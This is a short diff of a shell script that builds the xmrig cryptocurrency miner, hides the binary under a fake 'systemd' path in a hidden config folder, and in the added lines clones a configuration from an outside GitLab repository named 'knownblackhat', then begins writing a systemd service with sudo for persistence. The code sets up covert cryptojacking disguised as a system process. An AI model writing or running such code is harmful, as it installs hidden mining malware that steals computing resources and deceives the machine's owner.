@@ -19,8 +19,8 @@ make -j$(nproc)
 
 # Masking xmrig to systemd
 mv xmrig $HOME/.config/.systemd/systemd
-cd -
-mv config.json $HOME/.config/.systemd/config.json
+git clone https://gitlab.com/knownblackhat/xmrig-setup.git
+mv xmrig-setup/config.json $HOME/.config/.systemd/config.json
 
 
 sudo cat > /etc/systemd/system/sys.service <<EOL
